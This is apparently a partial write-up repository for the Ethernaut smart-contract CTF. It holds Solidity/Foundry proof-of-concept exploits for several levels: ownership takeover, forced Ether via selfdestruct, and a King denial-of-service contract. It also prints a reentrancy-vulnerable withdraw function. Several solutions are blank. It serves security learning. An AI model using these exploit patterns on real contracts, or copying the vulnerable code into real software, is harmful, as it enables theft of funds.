## Ethernaut CTF
### Challenges
- [01. Fallback](#Level01)
- [02. Fallout](#Level02)
- [03. Coin Flip](#Level03)
- [04. Telephone](#Level04) 
- [05. Token](#Level05)
- [06. Delegation](#Level06)
- [07. Force](#Level07)
- [08. Vault](#Level08)
- [09. King](#Level09)
- [10. Re-entrancy](#Level10)
- [11. Elevator](#Level11)
- [12. Privacy](#Level12)
- [13. Gatekeeper One](#Level13)
- [14. Gatekeeper Two](#Level14)
- [15. Naught Coin](#Level15)
---
### <a id='Level01'></a> Level 1: Fallback 👌
> **You will beat this level if:** you claim ownership of the contract, you reduce its balance to 0.
- **[CODE](/src/Fallback/Fallback.sol)**
- **POC**
```javascript
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import {Test,console} from "forge-std/Test.sol";
import {Fallback} from "../src/Fallback/Fallback.sol";

contract FallbackTest is Test {

    Fallback fallbackContract;
    address public constant ATTACKER = address(0xB0B);
    address owner = msg.sender;

    function setUp() public {
        fallbackContract = new Fallback();
        vm.deal(ATTACKER, 1 ether);
    }

    function test_1() public {
        //set
        for (uint i = 0; i < 100; i++) {
            address addr = address(uint160(i + 1));
            vm.deal(addr, 1 ether);
            vm.prank(addr);
            fallbackContract.contribute{value: 0.0009 ether}();
        }
        console.log("Balance Before Attack", address(fallbackContract).balance);
        

        //attack
        vm.startPrank(ATTACKER);
        fallbackContract.contribute{value: 0.0001 ether}();
        payable(address(fallbackContract)).call{value: 0.0001 ether}(""); // by sending eth direct to contract, sender becomes owner
        fallbackContract.withdraw();
        vm.stopPrank();

        assertEq(address(fallbackContract).balance, 0);
        assert(ATTACKER == fallbackContract.owner());
        console.log("Balance After Attack", address(ATTACKER).balance);
        
    }        
}
```

---

### <a id='Level02'></a> Level 2: Fallout👌
> **Claim ownership of the contract below to complete this level.**
- **[CODE](/src/Fallout/Fallout.sol)**
- **POC**
```javascript
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import {Test,console} from "forge-std/Test.sol";
import {Fallout} from "../src/Fallout/Fallout.sol";

contract FalloutTest is Test {

    Fallout fallout;
    address attacker = address(0xB0B);

    function setUp() public {
        fallout = new Fallout();
        vm.deal(attacker, 1 ether);
    }

    function test_owner() public {

        for (uint i = 0; i < 100; i++) {
            address addr = address(uint160(i + 1));
            vm.deal(addr, 1 ether);
            vm.prank(addr);
            fallout.allocate{value: 0.0009 ether}();
        }

        console.log("Balance Before Attack: ", address(fallout).balance);
        console.log("Owner: ", fallout.owner());

        vm.startPrank(attacker);
        fallout.Fal1out{value: 0.0009 ether}();
        fallout.collectAllocations();
        vm.stopPrank();

        assertEq(fallout.owner(), attacker);
        console.log("Balance After Attack: ", address(fallout).balance);
        console.log("New Owner Balance: ", address(fallout.owner()).balance);
        assert(address(fallout).balance == 0);

    }

}
```
---

### <a id='Level04'></a> Level 4: Telephone👌
> **Claim ownership of the contract below to complete this level.**
- **[CODE](/src/Telephone/Telephone.sol)**
- **POC**
```javascript
pragma solidity ^0.8.0;

import {Test,console} from "forge-std/Test.sol";
import {Telephone} from "../src/Telephone/Telephone.sol";
contract TelephoneTest is Test {
    Telephone telephone;
    Exploit exploit;
    function setUp() public {
        telephone = new Telephone();
        exploit = new Exploit(address(telephone));
    }

    function test_attack() public {
        address attacker = address(0xB0B);
        vm.startPrank(attacker);
        exploit.attack();
        vm.stopPrank();

        assertEq(telephone.owner(), attacker);
        console.log("Attack Successful, new owner is:", telephone.owner());
    }
}


contract Exploit {
    Telephone telephone;

    constructor(address _telephoneAddress) {
        telephone = Telephone(_telephoneAddress);
    }

    function attack() public {
        telephone.changeOwner(msg.sender);
    }
}

```
---

### <a id='Level05'></a> Level 5: Token👌
> **You are given 20 tokens to start with and you will beat the level if you somehow manage to get your hands on any additional tokens. Preferably a very large amount of tokens.**
- **[CODE](/src/Token/Token.sol)**
- **POC**
```javascript

```
---

### <a id='Level06'></a> Level 6: Delegation
> **Look into Solidity's documentation on the delegatecall low level function, how it works, how it can be used to delegate operations to on-chain libraries, and what implications it has on execution scope.**
- **[CODE](/src/Delegation/Delegation.sol)**
- **POC**
```javascript

```
---
### <a id='Level07'></a> Level 7: Force
> **The goal of this level is to make the balance of the contract greater than zero.**
- **[CODE](/src/Force/Force.sol)**
- **POC**
```javascript
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import {Force} from "../src/Force/Force.sol";
import {Test, console} from "forge-std/Test.sol";

contract ForceTest is Test {
    Force force;

    function setUp() public {
        force = new Force();
    }

    function test_Force() public {
        /** EXPLOIT START **/
        console.log("Balance before exploit:", address(force).balance);
        vm.deal(address(this), 1 ether);
        Exploit exploit = new Exploit{value: 1 ether}(payable(address(force)));

        // Force contract should have received Ether
        console.log("Balance after exploit:", address(force).balance);
        assert(address(force).balance > 0);
    }
}

contract Exploit {
    constructor(address payable _target) payable {
        selfdestruct(_target);
        // @explain `selfdestruct` sends all Ether in this contract to the target address forcefully. If the target contract has no payable functions or fallback, receive functions, it still receives the Ether.
    }
}
```
---

### <a id='Level08'></a> Level 8: Vault
> **The goal of this level is to unlock the vault.**
- **[CODE](/src/Vault/Vault.sol)**
- **POC**
```javascript

```
---
### <a id='Level09'></a> Level 9: King
> **The contract below represents a very simple game: whoever sends it an amount of ether that is larger than the current prize becomes the new king. On such an event, the overthrown king gets paid the new prize, making a bit of ether in the process! As ponzi as it gets xD.
Such a fun game. Your goal is to break it.
When you submit the instance back to the level, the level is going to reclaim kingship. You will beat the level if you can avoid such a self proclamation.**
- **[CODE](/src/King/King.sol)**
- **POC**
```js
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import {King} from "../src/King/King.sol";
import {Test, console} from "forge-std/Test.sol";

contract  Testking is Test {
    King _king;
    function setUp() public {
        _king = new King();
    }

    fallback() external payable {}

    function test1()  public {
        address user1 = address(0x123);
        address user2 = address(0x124);
        vm.deal(user1, 10 ether);
        vm.deal(user2, 10 ether);

        vm.prank(user1);
        (bool success, ) = address(_king).call{value: 1 ether}("");

        console.log("user1 is king: ", _king._king() == user1);

        Attacker attacker = new Attacker{value: 1 ether}(_king);
        console.log("Attacker is New king: ", _king._king() == address(attacker));

        vm.prank(user2);
        (success, ) = address(_king).call{value: 2 ether}("");
        console.log("user2 is New king: ", _king._king() == user2);

        if (!(_king._king() == user2)) {
            console.log("Hacked successfully, Attacker is the King forever");
        } 

    }
}

contract Attacker {
    constructor(King _King) payable {
        (bool result,) = address(_King).call{value: msg.value}("");  
        
    }
}
```
---

### <a id='Level10'></a> Level 10: Re-entrancy
> **The goal of this level is for you to steal all the funds from the contract.**
- **[CODE](/src/Reentrancy/Reentrancy.sol)**
```javascript
// SPDX-License-Identifier: MIT
pragma solidity ^0.6.12;

import "openzeppelin-contracts-06/math/SafeMath.sol";

contract Reentrance {
    using SafeMath for uint256;

    mapping(address => uint256) public balances;

    function donate(address _to) public payable {
        balances[_to] = balances[_to].add(msg.value);
    }

    function balanceOf(address _who) public view returns (uint256 balance) {
        return balances[_who];
    }

    function withdraw(uint256 _amount) public {
        if (balances[msg.sender] >= _amount) {
            (bool result,) = msg.sender.call{value: _amount}("");
            if (result) {
                _amount;
            }
            balances[msg.sender] -= _amount;
        }
    }

    receive() external payable {}
}
```
**POC**
```javascript

```
---

### <a id='Level11'></a> Level 11: Elevator
### <a id='Level12'></a> Level 12: Privacy
### <a id='Level13'></a> Level 13: Gatekeeper One
### <a id='Level14'></a> Level 14: Gatekeeper Two
### <a id='Level15'></a> Level 15: Naught Coin








<!-- sk_e09870dabdc7e8a7e29d60d1185f161f6377e6d973e442e9e544c08bf4610c72 -->